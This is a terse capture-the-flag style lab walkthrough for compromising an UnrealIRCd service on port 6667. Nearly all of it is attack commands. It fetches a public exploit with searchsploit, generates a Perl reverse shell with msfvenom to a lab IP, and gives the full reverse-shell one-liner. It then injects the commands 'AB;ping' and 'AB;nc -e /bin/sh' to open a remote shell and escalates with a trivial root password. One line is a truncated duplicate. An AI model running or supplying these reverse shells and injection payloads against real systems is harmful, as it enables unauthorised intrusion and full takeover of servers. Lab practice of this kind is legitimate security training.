----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# SunsetNoontide
# 4/2/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
Service Info: Host: irc.foonet.com



searchsploit UnrealIRCd 

searchsploit -m 13853.pl

└─$ msfvenom -p cmd/unix/reverse_perl LHOST=192.168.49.54 LPORT=4000 -f raw

perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.49.54:4000");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'

perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Sock>
remeber that, after -e you have to put “\” and in the end of line also, before single quotes (‘ ’).

perl 13853.pl <VICTIM’S_IP> 6667 1

nc -lvp 1234

sudo tcpdump -i tun0 icmp
AB;ping -c 3 192.168.49.54
AB;nc -e /bin/sh 192.168.49.54 1234
su root
root
